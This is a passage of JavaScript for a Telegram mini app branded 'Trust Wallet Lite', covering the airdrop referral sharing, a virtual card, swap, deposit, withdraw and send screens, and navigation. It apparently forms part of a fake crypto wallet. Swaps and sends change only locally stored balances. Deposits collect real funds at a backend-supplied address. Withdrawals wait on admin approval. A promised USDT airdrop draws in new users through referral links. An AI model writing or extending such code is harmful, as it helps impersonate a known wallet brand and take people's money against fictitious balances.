    const text = `🚀 Join Trust Wallet Lite and get ${AIRDROP_BONUS} USDT Airdrop! Use my link: ${BOT_LINK}?startapp=${userId}`;
    if (tg?.shareToStory) tg.shareToStory(text);
    else copyToClipboard(text);
}
function renderTWTPay() {
    const container = document.getElementById('twtpayContainer');
    if (!container) return;
    const twtBalance = userData?.balances?.TWT || 0;
    const cardNumber = userId?.slice(-4) || '8888';
    container.innerHTML = `<div class="virtual-card"><div class="card-chip"><i class="fas fa-microchip"></i></div><div class="card-brand">TWT Pay</div><div class="card-number"><span>****</span><span>****</span><span>****</span><span>${cardNumber}</span></div><div class="card-details"><div><div class="label">Card Holder</div><div class="value">${userData?.userName || 'User'}</div></div><div><div class="label">Expires</div><div class="value">12/28</div></div></div><div class="card-balance"><div class="balance-label">${t('card.balance')}</div><div class="balance-value">${twtBalance} TWT</div><div class="balance-usd">≈ $${(twtBalance * TWT_PRICE).toFixed(2)}</div></div><div class="card-footer"><i class="fab fa-visa"></i><span>Virtual Card</span></div></div><div class="card-actions"><button class="card-action-btn" onclick="showTopUp()"><i class="fas fa-plus-circle"></i><span>Top Up</span></button><button class="card-action-btn" onclick="showCardSettings()"><i class="fas fa-sliders-h"></i><span>Settings</span></button><button class="card-action-btn" onclick="showCardTransactions()"><i class="fas fa-history"></i><span>History</span></button></div>`;
}
function showTopUp() { showToast('Coming soon!'); }
function showCardSettings() { showToast('Coming soon!'); }
function showCardTransactions() { showHistory(); }
function renderSettings() {
    const container = document.getElementById('settingsContainer');
    if (!container) return;
    container.innerHTML = `<div class="settings-list"><div class="settings-item" onclick="showNotifications()"><i class="fas fa-bell"></i><div><div class="label">${t('notifications.title')}</div><div class="desc">View all notifications</div></div><i class="fas fa-chevron-right"></i></div><div class="settings-item" onclick="showHistory()"><i class="fas fa-history"></i><div><div class="label">${t('actions.history')}</div><div class="desc">View all transactions</div></div><i class="fas fa-chevron-right"></i></div><div class="settings-item" onclick="toggleLanguage()"><i class="fas fa-language"></i><div><div class="label">${t('settings.language')}</div><div class="desc">${currentLanguage === 'en' ? 'English / العربية' : 'العربية / English'}</div></div><i class="fas fa-chevron-right"></i></div><div class="settings-item" onclick="toggleTheme()"><i class="fas fa-moon"></i><div><div class="label">${t('settings.theme')}</div><div class="desc">${currentTheme === 'dark' ? 'Dark Mode' : 'Light Mode'}</div></div><i class="fas fa-chevron-right"></i></div><div class="settings-item logout-btn" onclick="logout()"><i class="fas fa-sign-out-alt"></i><div><div class="label">${t('settings.logout')}</div><div class="desc">Sign out of your wallet</div></div></div></div>`;
}
function showHistory() {
    const modal = document.getElementById('historyModal');
    const list = document.getElementById('historyList');
    if (!modal || !list) return;
    const txs = userData?.transactions || [];
    if (txs.length === 0) list.innerHTML = '<div class="empty-state"><i class="fa-regular fa-clock"></i><p>No transactions yet</p></div>';
    else list.innerHTML = txs.map(tx => `<div class="history-item"><div class="history-item-header"><div class="history-type ${tx.type}"><i class="fa-regular ${tx.type === 'deposit' ? 'fa-circle-down' : tx.type === 'withdraw' ? 'fa-circle-up' : 'fa-arrow-right-arrow-left'}"></i><span>${tx.type.charAt(0).toUpperCase() + tx.type.slice(1)}</span></div><span class="history-status ${tx.status || 'completed'}">${tx.status || 'Completed'}</span></div><div class="history-details"><span class="history-amount">${tx.amount} ${tx.currency}</span><span class="history-date">${new Date(tx.timestamp).toLocaleString()}</span></div></div>`).join('');
    modal.classList.add('show');
}
function filterHistory(filter) {
    currentHistoryFilter = filter;
    document.querySelectorAll('.history-tab').forEach(t => t.classList.remove('active'));
    event.target.classList.add('active');
    renderHistory(filter);
}
function renderHistory(filter = 'all') {
    const list = document.getElementById('historyList');
    if (!list) return;
    let txs = userData?.transactions || [];
    if (filter !== 'all') txs = txs.filter(tx => tx.type === filter);
    if (txs.length === 0) list.innerHTML = '<div class="empty-state"><i class="fa-regular fa-clock"></i><p>No transactions yet</p></div>';
    else list.innerHTML = txs.map(tx => `<div class="history-item"><div class="history-item-header"><div class="history-type ${tx.type}"><i class="fa-regular ${tx.type === 'deposit' ? 'fa-circle-down' : tx.type === 'withdraw' ? 'fa-circle-up' : 'fa-arrow-right-arrow-left'}"></i><span>${tx.type.charAt(0).toUpperCase() + tx.type.slice(1)}</span></div><span class="history-status ${tx.status || 'completed'}">${tx.status || 'Completed'}</span></div><div class="history-details"><span class="history-amount">${tx.amount} ${tx.currency}</span><span class="history-date">${new Date(tx.timestamp).toLocaleString()}</span></div></div>`).join('');
}

// ====== 20. SWAP FUNCTIONS ======
function showSwapModal() {
    const modal = document.getElementById('swapModal');
    if (modal) modal.classList.add('show');
    renderSwapModal();
}
function renderSwapModal() {
    const container = document.getElementById('swapModalContent');
    if (!container) return;
    container.innerHTML = `<div class="swap-box"><div class="swap-label">${t('swap.from')}</div><div class="swap-row"><input type="number" id="swapFromAmount" placeholder="0.00" oninput="calculateSwap()"><div class="currency-selector-small" onclick="showSwapCurrencySelector('from')"><img id="swapFromIcon" src="${getCurrencyIcon(swapFromCurrency)}"><span id="swapFromSymbol">${swapFromCurrency}</span><i class="fas fa-chevron-down"></i></div></div><div class="balance-hint">Balance: <span id="swapFromBalance">0</span><span class="percentage-buttons"><button onclick="setSwapPercentage(25)">25%</button><button onclick="setSwapPercentage(50)">50%</button><button onclick="setSwapPercentage(100)">Max</button></span></div></div><div class="swap-arrow" onclick="swapDirection()"><i class="fas fa-arrow-down"></i></div><div class="swap-box"><div class="swap-label">${t('swap.to')}</div><div class="swap-row"><input type="number" id="swapToAmount" placeholder="0.00" readonly><div class="currency-selector-small" onclick="showSwapCurrencySelector('to')"><img id="swapToIcon" src="${getCurrencyIcon(swapToCurrency)}"><span id="swapToSymbol">${swapToCurrency}</span><i class="fas fa-chevron-down"></i></div></div><div class="balance-hint">Balance: <span id="swapToBalance">0</span></div></div><div class="swap-rate" id="swapRateDisplay">1 ${swapFromCurrency} ≈ ${(swapFromCurrency === 'USDT' && swapToCurrency === 'TWT') ? SWAP_RATE.toLocaleString() : (swapFromCurrency === 'TWT' && swapToCurrency === 'USDT') ? (1/SWAP_RATE).toFixed(6) : '0'}</div><div class="swap-fee"><span>${t('swap.swapperFee')} (0.3%)</span><span id="swapFee">$0.00</span></div><button class="btn-primary" onclick="confirmSwap()">${t('swap.confirm')}</button>`;
    updateSwapBalances();
    calculateSwap();
}
function updateSwapBalances() {
    if (!userData) return;
    document.getElementById('swapFromBalance').innerText = userData.balances[swapFromCurrency] || 0;
    document.getElementById('swapToBalance').innerText = userData.balances[swapToCurrency] || 0;
}
function showSwapCurrencySelector(type) {
    currentCurrencySelector = type;
    const modal = document.getElementById('currencySelectorModal');
    const list = document.getElementById('currencyList');
    if (!list) return;
    list.innerHTML = SWAP_CURRENCIES.map(curr => `<div class="currency-list-item" onclick="selectSwapCurrency('${curr.symbol}')"><img src="${curr.icon}"><div><h4>${curr.name}</h4><p>${curr.symbol}</p></div></div>`).join('');
    modal.classList.add('show');
}
function selectSwapCurrency(symbol) {
    if (currentCurrencySelector === 'from') {
        swapFromCurrency = symbol;
        document.getElementById('swapFromIcon').src = getCurrencyIcon(symbol);
        document.getElementById('swapFromSymbol').innerText = symbol;
    } else {
        swapToCurrency = symbol;
        document.getElementById('swapToIcon').src = getCurrencyIcon(symbol);
        document.getElementById('swapToSymbol').innerText = symbol;
    }
    closeModal('currencySelectorModal');
    updateSwapBalances();
    calculateSwap();
}
function calculateSwap() {
    const amount = parseFloat(document.getElementById('swapFromAmount')?.value) || 0;
    let toAmount = 0;
    let rate = 0;
    if (swapFromCurrency === 'USDT' && swapToCurrency === 'TWT') { rate = SWAP_RATE; toAmount = amount * rate; }
    else if (swapFromCurrency === 'TWT' && swapToCurrency === 'USDT') { rate = 1 / SWAP_RATE; toAmount = amount * rate; }
    else {
        const fromPrice = swapFromCurrency === 'TWT' ? TWT_PRICE : (livePrices[swapFromCurrency]?.price || 0);
        const toPrice = swapToCurrency === 'TWT' ? TWT_PRICE : (livePrices[swapToCurrency]?.price || 0);
        if (fromPrice > 0 && toPrice > 0) { rate = fromPrice / toPrice; toAmount = amount * rate; }
    }
    document.getElementById('swapToAmount').value = toAmount.toFixed(6);
    const fee = amount * (swapFromCurrency === 'USDT' ? 0.003 : (swapFromCurrency === 'TWT' ? 0.003 * TWT_PRICE : 0.003));
    document.getElementById('swapFee').innerHTML = `$${fee.toFixed(4)}`;
    document.getElementById('swapRateDisplay').innerHTML = `1 ${swapFromCurrency} ≈ ${rate.toFixed(6)} ${swapToCurrency}`;
}
function setSwapPercentage(percent) {
    const balance = userData?.balances[swapFromCurrency] || 0;
    document.getElementById('swapFromAmount').value = balance * (percent / 100);
    calculateSwap();
}
function swapDirection() {
    const temp = swapFromCurrency;
    swapFromCurrency = swapToCurrency;
    swapToCurrency = temp;
    document.getElementById('swapFromIcon').src = getCurrencyIcon(swapFromCurrency);
    document.getElementById('swapFromSymbol').innerText = swapFromCurrency;
    document.getElementById('swapToIcon').src = getCurrencyIcon(swapToCurrency);
    document.getElementById('swapToSymbol').innerText = swapToCurrency;
    updateSwapBalances();
    calculateSwap();
    animateElement('.swap-arrow', 'pop');
}
async function confirmSwap() {
    const amount = parseFloat(document.getElementById('swapFromAmount')?.value);
    const toAmount = parseFloat(document.getElementById('swapToAmount')?.value);
    if (!amount || amount <= 0) { showToast('Enter valid amount', 'error'); return; }
    if ((userData.balances[swapFromCurrency] || 0) < amount) { showToast('Insufficient balance', 'error'); return; }
    userData.balances[swapFromCurrency] -= amount;
    userData.balances[swapToCurrency] = (userData.balances[swapToCurrency] || 0) + toAmount;
    if (!userData.transactions) userData.transactions = [];
    userData.transactions.unshift({ type: 'swap', amount: amount, fromCurrency: swapFromCurrency, toCurrency: swapToCurrency, toAmount: toAmount, timestamp: new Date().toISOString() });
    saveUserData();
    updateUI();
    updateSwapBalances();
    document.getElementById('swapFromAmount').value = '';
    calculateSwap();
    closeModal('swapModal');
    showToast('Swap completed!');
}

// ====== 21. DEPOSIT FUNCTIONS ======
async function showDepositModal() {
    const modal = document.getElementById('depositModal');
    if (modal) modal.classList.add('show');
    const currency = document.getElementById('depositCurrency')?.value || 'USDT';
    const addressSpan = document.getElementById('depositAddress');
    if (addressSpan && userData && userData.depositAddress) addressSpan.innerText = userData.depositAddress;
    else if (addressSpan && userData) {
        addressSpan.innerText = 'Loading address...';
        try {
            const response = await apiCall('/deposit-address', 'POST', { userId, currency });
            if (response.address) { userData.depositAddress = response.address; saveUserData(); addressSpan.innerText = response.address; }
            else addressSpan.innerText = `0x${userId.slice(-40).padStart(40, '0')}`;
        } catch (error) { addressSpan.innerText = `0x${userId.slice(-40).padStart(40, '0')}`; }
    }
    updateDepositInfo();
}
function updateDepositInfo() {
    const currency = document.getElementById('depositCurrency').value;
    document.getElementById('depositIcon').src = getCurrencyIcon(currency);
    const minAmount = DEPOSIT_MINIMUMS[currency] || 10;
    document.getElementById('depositMinAmount').innerText = `${minAmount} ${currency}`;
    const amountInput = document.getElementById('depositAmount');
    if (amountInput) amountInput.placeholder = `Min ${minAmount} ${currency}`;
}
function copyDepositAddress() {
    const address = document.getElementById('depositAddress')?.innerText;
    if (address && address !== 'Loading address...') copyToClipboard(address);
}
function validateTransactionHashInput() {
    const hash = document.getElementById('txnId')?.value.trim();
    const hint = document.getElementById('hashValidationHint');
    const submitBtn = document.getElementById('submitDepositBtn');
    if (!hash) { if (hint) hint.style.display = 'none'; if (submitBtn) submitBtn.disabled = true; return; }
    const isValid = hash.startsWith('0x') && hash.length === 66;
    if (hint) { hint.textContent = isValid ? '✓ Valid transaction hash' : 'Invalid format. Must start with 0x and be 66 characters'; hint.className = isValid ? 'validation-hint valid' : 'validation-hint invalid'; hint.style.display = 'block'; }
    if (submitBtn) submitBtn.disabled = !isValid;
}
async function submitDeposit() {
    const currency = document.getElementById('depositCurrency').value;
    const amount = parseFloat(document.getElementById('depositAmount')?.value);
    const txnId = document.getElementById('txnId')?.value.trim();
    if (!amount || amount <= 0) { showToast('Enter valid amount', 'error'); return; }
    if (!txnId) { showToast('Please enter transaction ID', 'error'); return; }
    const minAmount = DEPOSIT_MINIMUMS[currency] || 0;
    if (amount < minAmount) { showToast(`Minimum deposit is ${minAmount} ${currency}`, 'error'); return; }
    const depositRequest = { id: 'deposit_' + Date.now(), userId, userName, currency, amount, txnId, address: userData?.depositAddress, status: 'pending', timestamp: new Date().toISOString(), type: 'deposit' };
    const submitBtn = document.getElementById('submitDepositBtn');
    if (submitBtn) { submitBtn.disabled = true; submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Processing...'; }
    try {
        if (!userData.transactions) userData.transactions = [];
        userData.transactions.unshift(depositRequest);
        saveUserData();
        showToast('Deposit request submitted!', 'success');
        closeModal('depositModal');
        if (submitBtn) setTimeout(() => { submitBtn.disabled = false; submitBtn.innerHTML = 'Submit Deposit'; }, 1000);
    } catch (error) { showToast('Failed to submit deposit', 'error'); }
}

// ====== 22. WITHDRAW FUNCTIONS ======
function showWithdrawModal() { document.getElementById('withdrawModal').classList.add('show'); updateWithdrawFee(); }
function updateWithdrawFee() {
    const currency = document.getElementById('withdrawCurrency').value;
    const amount = parseFloat(document.getElementById('withdrawAmount')?.value) || 0;
    const fee = currency === 'USDT' ? 0.00016 : (currency === 'BNB' ? 0.0005 : 0);
    document.getElementById('withdrawFee').innerText = fee;
    document.getElementById('receiveAmount').innerText = (amount - fee).toFixed(currency === 'USDT' ? 2 : 4);
}
function validateWithdrawAddress() {
    const address = document.getElementById('withdrawAddress')?.value.trim();
    const hint = document.getElementById('withdrawAddressHint');
    const submitBtn = document.getElementById('submitWithdrawBtn');
    if (!address) { if (hint) hint.style.display = 'none'; if (submitBtn) submitBtn.disabled = true; return; }
    const isValid = address.startsWith('0x') && address.length === 42;
    if (hint) { hint.textContent = isValid ? '✓ Valid address' : 'Invalid address. Must start with 0x and be 42 characters'; hint.className = isValid ? 'validation-hint valid' : 'validation-hint invalid'; hint.style.display = 'block'; }
    if (submitBtn) submitBtn.disabled = !isValid;
}
async function submitWithdraw() {
    const currency = document.getElementById('withdrawCurrency').value;
    const amount = parseFloat(document.getElementById('withdrawAmount')?.value);
    const address = document.getElementById('withdrawAddress')?.value.trim();
    if (!amount || amount <= 0) { showToast('Enter valid amount', 'error'); return; }
    if (!address) { showToast('Enter withdrawal address', 'error'); return; }
    if ((userData.balances[currency] || 0) < amount) { showToast('Insufficient balance', 'error'); return; }
    userData.balances[currency] -= amount;
    if (!userData.transactions) userData.transactions = [];
    userData.transactions.unshift({ type: 'withdraw', amount, currency, address, status: 'pending', timestamp: new Date().toISOString() });
    saveUserData();
    updateUI();
    closeModal('withdrawModal');
    showToast('Withdrawal request submitted!', 'success');
}

// ====== 23. SEND/RECEIVE FUNCTIONS ======
function showSendModal() { document.getElementById('sendModal').classList.add('show'); }
function showReceiveModal() { document.getElementById('receiveModal').classList.add('show'); document.getElementById('receiveAddress').innerText = userId; }
function sendTransaction() {
    const currency = document.getElementById('sendCurrency').value;
    const amount = parseFloat(document.getElementById('sendAmount')?.value);
    const address = document.getElementById('sendAddress')?.value.trim();
    if (!amount || amount <= 0 || !address) { showToast('Fill all fields', 'error'); return; }
    if ((userData.balances[currency] || 0) < amount) { showToast('Insufficient balance', 'error'); return; }
    userData.balances[currency] -= amount;
    saveUserData();
    updateUI();
    closeModal('sendModal');
    showToast(`Sent ${amount} ${currency}`, 'success');
}
function copyAddress() { copyToClipboard(document.getElementById('receiveAddress')?.innerText); }

// ====== 24. NAVIGATION ======
function showWallet() {
    currentPage = 'wallet';
    document.getElementById('walletSection').classList.remove('hidden');
    document.getElementById('swapSection').classList.add('hidden');
    document.getElementById('referralSection').classList.add('hidden');
    document.getElementById('twtpaySection').classList.add('hidden');
    document.getElementById('settingsSection').classList.add('hidden');
    document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active'));
    document.querySelector('.nav-item[data-tab="wallet"]')?.classList.add('active');
    renderWallet();
    showRandomSticker();
}
function showSwap() {
    currentPage = 'swap';
    document.getElementById('walletSection').classList.add('hidden');
    document.getElementById('swapSection').classList.remove('hidden');
    document.getElementById('referralSection').classList.add('hidden');
    document.getElementById('twtpaySection').classList.add('hidden');
    document.getElementById('settingsSection').classList.add('hidden');
    document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active'));
    document.querySelector('.nav-item[data-tab="swap"]')?.classList.add('active');
    showSwapModal();
}
function showAirdrop() {
    currentPage = 'airdrop';
    document.getElementById('walletSection').classList.add('hidden');
    document.getElementById('swapSection').classList.add('hidden');
    document.getElementById('referralSection').classList.remove('hidden');
    document.getElementById('twtpaySection').classList.add('hidden');
    document.getElementById('settingsSection').classList.add('hidden');
    document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active'));
    document.querySelector('.nav-item[data-tab="referral"]')?.classList.add('active');
    renderAirdrop();
    showRandomSticker();
}
function showTWTPay() {
    currentPage = 'twtpay';
    document.getElementById('walletSection').classList.add('hidden');
    document.getElementById('swapSection').classList.add('hidden');
    document.getElementById('referralSection').classList.add('hidden');
    document.getElementById('twtpaySection').classList.remove('hidden');
    document.getElementById('settingsSection').classList.add('hidden');
    document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active'));
    document.querySelector('.nav-item[data-tab="twtpay"]')?.classList.add('active');
    renderTWTPay();
    showRandomSticker();
}
function showSettings() {
    currentPage = 'settings';
    document.getElementById('walletSection').classList.add('hidden');
    document.getElementById('swapSection').classList.add('hidden');
    document.getElementById('referralSection').classList.add('hidden');
    document.getElementById('twtpaySection').classList.add('hidden');
    document.getElementById('settingsSection').classList.remove('hidden');
    document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active'));
    document.querySelector('.nav-item[data-tab="settings"]')?.classList.add('active');
    renderSettings();
    showRandomSticker();
}

// ====== 25. STICKER SYSTEM ======
const WELCOME_STICKERS = ['🤝', '🫣', '🥰', '🥳', '💲', '💰', '💸', '💵', '🤪', '😱', '😤', '😎', '🤑', '💯', '💖', '👑', '❤️‍🔥', '🫂', '🔥', '🧡', '🤑', '🧟', '🎁', '💌', '🎉', '❤️‍🔥', '👑', '🚀', '💟', '🤍'];
let lastStickerTime = 0;
const STICKER_COOLDOWN = 12 * 60 * 1000;
function showRandomSticker() {
    const now = Date.now();
    if (now - lastStickerTime < STICKER_COOLDOWN) return;
    const stickerElement = document.getElementById('welcomeSticker');
    if (!stickerElement) return;
    const randomSticker = WELCOME_STICKERS[Math.floor(Math.random() * WELCOME_STICKERS.length)];
    stickerElement.textContent = randomSticker;
    stickerElement.classList.remove('sticker-pop', 'sticker-shake');
    void stickerElement.offsetWidth;
    stickerElement.classList.add('sticker-pop');
    setTimeout(() => stickerElement.classList.add('sticker-shake'), 200);
    setTimeout(() => { stickerElement.classList.remove('sticker-pop', 'sticker-shake'); setTimeout(() => stickerElement.textContent = '', 300); }, 3000);
    lastStickerTime = now;
}
function scrollToTop() { window.scrollTo({ top: 0, behavior: 'smooth' }); }

// ====== 26. INITIALIZATION ======
document.addEventListener('DOMContentLoaded', async () => {
    console.log("🚀 Initializing Trust Wallet Lite...");
    initTheme();
    updateAllTexts();
    document.getElementById('createWalletBtn')?.addEventListener('click', createNewWallet);
    document.getElementById('importWalletBtn')?.addEventListener('click', showImportModal);
    document.getElementById('confirmImportBtn')?.addEventListener('click', importWallet);
    document.getElementById('refreshPricesBtn')?.addEventListener('click', refreshPrices);
    document.querySelectorAll('.nav-item').forEach(btn => {
        btn.addEventListener('click', () => {
            const tab = btn.getAttribute('data-tab');
            if (tab === 'wallet') showWallet();
            else if (tab === 'swap') showSwap();
            else if (tab === 'referral') showAirdrop();
            else if (tab === 'twtpay') showTWTPay();
            else if (tab === 'settings') showSettings();
        });
    });
    await fetchLivePrices();
    await loadUserData();
    checkAdminAndAddCrown();
    setTimeout(() => {
        const splash = document.getElementById('splashScreen');
        if (splash) splash.classList.add('hidden');
        setTimeout(() => showRandomSticker(), 500);
    }, 1500);
    console.log("✅ Trust Wallet Lite initialized!");
    console.log("📱 User ID:", userId);
    console.log("👑 Is Admin:", isAdmin);
});

// ====== 27. EXPORT GLOBALS (PROFESSIONAL) ======
// Navigation
window.showWallet = showWallet;
window.showSwap = showSwap;
window.showAirdrop = showAirdrop;
window.showTWTPay = showTWTPay;
window.showSettings = showSettings;

// Actions
window.showDepositModal = showDepositModal;
window.showWithdrawModal = showWithdrawModal;
window.showSendModal = showSendModal;
window.showReceiveModal = showReceiveModal;
window.showSwapModal = showSwapModal;
window.showHistory = showHistory;
window.showNotifications = showNotifications;
window.showAdminPanel = showAdminPanel;

// Modals
window.closeModal = closeModal;
window.closeAdminPanel = closeAdminPanel;

// Utilities
window.toggleLanguage = toggleLanguage;
window.toggleTheme = toggleTheme;
window.logout = logout;
window.scrollToTop = scrollToTop;
window.refreshPrices = refreshPrices;
window.copyToClipboard = copyToClipboard;

// Airdrop
window.copyInviteLink = copyInviteLink;
window.shareReferral = shareReferral;
window.claimMilestone = claimMilestone;

// Swap
window.showSwapCurrencySelector = showSwapCurrencySelector;
window.selectSwapCurrency = selectSwapCurrency;
window.calculateSwap = calculateSwap;
window.setSwapPercentage = setSwapPercentage;
window.swapDirection = swapDirection;
window.confirmSwap = confirmSwap;

// Admin
window.refreshAdminPanel = refreshAdminPanel;
window.approveTransaction = approveTransaction;
window.rejectTransaction = rejectTransaction;

// Deposit/Withdraw
window.copyDepositAddress = copyDepositAddress;
window.validateTransactionHashInput = validateTransactionHashInput;
window.submitDeposit = submitDeposit;
window.validateWithdrawAddress = validateWithdrawAddress;
window.submitWithdraw = submitWithdraw;

// Send/Receive
window.sendTransaction = sendTransaction;
window.copyAddress = copyAddress;

// Other
window.showTopUp = showTopUp;
window.showCardSettings = showCardSettings;
window.showCardTransactions = showCardTransactions;
window.showCryptoDetails = showCryptoDetails;
window.showAssetDetails = showAssetDetails;
window.createNewWallet = createNewWallet;
window.importWallet = importWallet;
window.showImportModal = showImportModal;
window.markNotificationRead = markNotificationRead;
window.clearReadNotifications = clearReadNotifications;
window.clearAllNotifications = clearAllNotifications;
window.filterHistory = filterHistory;

console.log("✅ Trust Wallet Lite - PROFESSIONAL VERSION READY!");
